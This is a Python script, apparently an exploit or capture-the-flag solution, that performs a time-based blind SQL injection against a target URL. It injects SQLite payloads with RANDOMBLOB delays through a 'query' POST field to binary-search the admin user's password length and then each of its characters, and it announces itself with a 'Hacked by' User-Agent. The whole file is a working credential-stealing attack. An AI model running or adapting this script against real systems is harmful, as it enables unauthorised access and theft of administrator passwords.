import requests
from time import time
import sys

URL = sys.argv[1]
UA = 'Hacked by @Zer0DayZorro'

# Find password length
l, r = 0, 50
while l < r:
    m = (l+r) // 2
    t0 = time()
    requests.post(URL, data={'query': f"wat'||(SELECT 'test' WHERE 8287=(CASE WHEN (SELECT length(password) FROM users WHERE username='admin')>{m} THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(400000000/2))))) ELSE 8287 END))||'"}, headers={'User-Agent': UA})
    diff = time() - t0
    if diff > 0.1:
        l = m + 1
    else:
        r = m

pw_length = r

print(pw_length)

# Find password
pw = []
for i in range(pw_length):
    l, r = 0, 255
    while l < r:
        m = (l+r) // 2
        t0 = time()
        requests.post(URL, data={'query': f"wat'||(SELECT 'test' WHERE 8287=(CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin' LIMIT 0,1),{i+1},1)>CHAR({m})) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(400000000/2))))) ELSE 8287 END))||'"}, headers={'User-Agent': UA})
        diff = time() - t0
        if diff > 0.1:
            l = m + 1
        else:
            r = m

    print(chr(r))
    pw.append(chr(r))

print(''.join(pw))
